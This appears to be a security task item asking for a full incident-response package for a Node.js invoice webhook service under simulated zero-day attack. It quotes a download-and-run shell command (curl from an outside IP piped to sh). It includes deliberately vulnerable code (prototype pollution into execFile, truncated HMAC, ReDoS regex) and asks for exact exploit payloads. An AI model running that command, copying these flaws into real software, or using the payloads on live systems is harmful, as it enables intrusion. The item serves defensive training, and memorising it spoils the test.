---
id: sec-live-zero-day-patch
title: Security: Live Zero-Day Emergency Hot-Patch, Virtual WAF & Canary Rollout
category: security
language: null
functionName: solution
executable: false
---
Act as a Principal Production Security Incident Commander and Staff Runtime Security Engineer responding to an **active SEV-0 zero-day exploitation** against `invoice-webhook-gateway` (a Node.js 22 microservice running on GKE behind Google Cloud Armor and Envoy Ingress at **45,000 RPS** during peak financial settlement).

### Live Incident Telemetry
- **Symptom 1 (RCE)**: EDR sensors just alerted on `/usr/bin/wkhtmltopdf` spawning `/bin/sh -c curl http://198.51.100.77/stage2.sh | sh` inside 3 production pods, even though `execFile` is used instead of `exec` and no command flags are passed directly in user fields.
- **Symptom 2 (Event-Loop Freeze)**: 40% of pods are failing readiness probes with `event_loop_lag_seconds > 14s` whenever requests arrive carrying a 58-character `X-Callback-Origin` header.
- **Symptom 3 (Forged Webhooks)**: Attacker requests are bypassing HMAC webhook verification after ~65,000 brute-force/timing probes and replaying captured settlement webhooks from 48 hours ago.
- **Business Constraint**: You **cannot** take the service offline. Normal settlement webhooks and PDF invoice rendering must continue operating at 45,000 RPS with `<15ms` p99 added latency.

---

### Vulnerable Production Code (`src/server.js`)

```javascript
const express = require('express');
const crypto = require('crypto');
const { execFile } = require('child_process');

const app = express();
app.use(express.json({ limit: '512kb' }));

const WEBHOOK_SECRET = process.env.WEBHOOK_HMAC_SECRET;

// Validate callback origin header format
const CALLBACK_ORIGIN_REGEX =
  /^https?:\/\/([a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.)+[a-zA-Z]{2,}(\/([a-zA-Z0-9._~:/?#\[\]@!$&'()*+,;=-]+)*)*$/;

function deepMerge(target, source) {
  for (const key of Object.keys(source)) {
    const val = source[key];
    if (val && typeof val === 'object' && !Array.isArray(val)) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      deepMerge(target[key], val);
    } else {
      target[key] = val;
    }
  }
  return target;
}

function verifyWebhookSignature(rawBody, providedSig, timestampHeader) {
  if (!providedSig || !timestampHeader) return false;
  const expectedSig = crypto
    .createHmac('sha256', WEBHOOK_SECRET)
    .update(`${timestampHeader}.${rawBody}`)
    .digest('hex');

  // Compare first 16 hex chars (64 bits) for performance
  return providedSig.slice(0, 16) === expectedSig.slice(0, 16);
}

app.post('/v1/webhooks/invoice-render', (req, res) => {
  const originHeader = req.headers['x-callback-origin'] || '';
  if (originHeader && !CALLBACK_ORIGIN_REGEX.test(originHeader)) {
    return res.status(400).json({ error: 'Invalid callback origin' });
  }

  const sig = req.headers['x-webhook-signature'];
  const ts = req.headers['x-webhook-timestamp'];
  if (!verifyWebhookSignature(JSON.stringify(req.body), sig, ts)) {
    return res.status(401).json({ error: 'Invalid signature' });
  }

  // Merge tenant styling preferences with default render options
  const renderOpts = deepMerge(
    { pageSize: 'A4', margin: '10mm', Orientation: 'Portrait' },
    req.body.preferences || {}
  );

  const invoiceId = String(req.body.invoiceId || '').replace(/[^a-zA-Z0-9_-]/g, '');
  const pdfArgs = [
    '--page-size', String(renderOpts.pageSize),
    '--margin-top', String(renderOpts.margin),
    `/var/spool/invoices/${invoiceId}.html`,
    `/var/spool/invoices/${invoiceId}.pdf`,
  ];

  // Execute wkhtmltopdf binary
  execFile(
    '/usr/bin/wkhtmltopdf',
    pdfArgs,
    {
      timeout: 5000,
      shell: renderOpts.useShell,      // undefined by default unless polluted!
      env: renderOpts.customEnv,       // undefined by default unless polluted!
    },
    (err) => {
      if (err) return res.status(500).json({ error: 'Render failed' });
      return res.status(200).json({ status: 'rendered', invoiceId });
    }
  );
});

module.exports = app;
```

---

### Required Deliverables

Produce a complete, battle-ready **Emergency Zero-Day Hot-Patch & Rollout Engineering Package** in clean Markdown with the following 4 sections:

1. **Section 1: Root-Cause & Exploitability Triage Matrix**
   - Analyze all **3 vulnerabilities** (`Prototype Pollution → execFile RCE Gadget Chain`, `Truncated Non-Constant-Time HMAC + Replay + JSON Re-Serialization Flaw`, and `Nested Quantifier ReDoS`).
   - Present a Markdown table with columns: `Vuln ID | CWE & CVSS v4.0 | Exact Exploit Payload / Trigger | Mechanical Root Cause in src/server.js | Blast Radius at 45k RPS`.
   - Show the exact JSON body and HTTP headers that trigger (a) the `execFile` RCE gadget chain via `Object.prototype.useShell` / `Object.prototype.customEnv` (`BASH_ENV` / `NODE_OPTIONS` or shell injection), and (b) the 58-byte `X-Callback-Origin` ReDoS stall.

2. **Section 2: Tier-1 Immediate Edge Virtual Patch (`< 2 Minutes`, Zero Code Deploy)**
   - **Artifact 2A — Google Cloud Armor CEL Rule**: Write the exact `gcloud compute security-policies rules create` command and CEL expression blocking `__proto__`, `constructor`, `prototype` in request bodies, capping `x-callback-origin` length/characters, and enforcing full 64-hex-char `x-webhook-signature` + fresh `x-webhook-timestamp`.
   - **Artifact 2B — Envoy `envoy.filters.http.lua` Inline Filter**: Write a drop-in Envoy Lua filter (`envoy_on_request`) that inspects and rejects malicious headers/payloads and enforces a strict timestamp freshness window at the ingress proxy layer.
   - **Artifact 2C — Kubernetes `NetworkPolicy` Egress Lock**: Write a K8s `NetworkPolicy` YAML that immediately blocks all pod egress from `invoice-webhook-gateway` except DNS (`53/UDP`) and internal cluster dependencies, killing reverse shells on the spot.

3. **Section 3: Tier-2 Permanent Code Fix & Unified Diff (`< 10 Minutes`)**
   - Provide the **complete, drop-in replacement `src/server.js`** AND a **Unified Diff (`diff -u`)** that:
     - Freezes `Object.prototype` at startup (`Object.freeze(Object.prototype)`) and replaces `deepMerge` with a null-prototype (`Object.create(null)`), schema-allowlisted shallow copy.
     - Hard-codes `shell: false` and an explicit minimal environment allowlist (`env: { PATH: '/usr/bin', LC_ALL: 'C' }`) in `execFile`, and validates `pdfArgs` so arguments starting with `-` cannot be injected via `pageSize` or `margin`.
     - Captures the raw request buffer (`express.raw` / `verify` callback) instead of re-serializing `JSON.stringify(req.body)`, enforces a `±300s` timestamp replay window + nonce deduplication, and uses `crypto.timingSafeEqual` over the full 32-byte (256-bit) HMAC digest.
     - Replaces `CALLBACK_ORIGIN_REGEX` with deterministic, `O(n)` length-bounded `new URL(originHeader)` validation.

4. **Section 4: Tier-3 Progressive Canary Rollout, PromQL Auto-Rollback & Verification Suite**
   - Provide a staged rollout table (`1% → 10% → 50% → 100%`) with bake times, exact **Prometheus PromQL queries** for automated Flagger/Argo Rollouts abort triggers (p99 latency, 5xx rate, `nodejs_eventloop_lag_seconds`, unexpected child process spawns), and `curl` verification commands proving all 3 exploits fail while legitimate traffic succeeds.
